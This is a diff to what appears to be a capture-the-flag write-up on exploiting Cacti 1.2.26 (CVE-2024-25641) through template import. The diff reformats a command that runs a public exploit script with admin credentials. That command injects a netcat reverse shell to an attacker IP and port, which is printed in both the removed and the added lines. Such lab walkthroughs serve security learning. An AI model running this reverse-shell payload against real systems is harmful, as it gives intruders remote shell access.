@@ -85,10 +85,14 @@ Cacti 1.2.26 suffers from rce via import template.
 https://github.com/StopThatTalace/CVE-2024-25641-CACTI-RCE-1.2.26
 
 ```
-my-venv/bin/python3 CVE-2024-25641.py --user admin --pass greencacti2001 --cmd "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.11 4444 >/tmp/f" http://cacti.monitorsthree.htb/cacti/
+my-venv/bin/python3 CVE-2024-25641.py \
+    --user admin \
+    --pass greencacti2001 \
+    --cmd "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.11 4444 >/tmp/f" \
+    http://cacti.monitorsthree.htb/cacti/
 ```
+This provides access to www-data on the machine.
 
-![image](https://github.com/user-attachments/assets/373304ee-4591-4022-ac3d-dce61361783d)
 
 &nbsp;
 
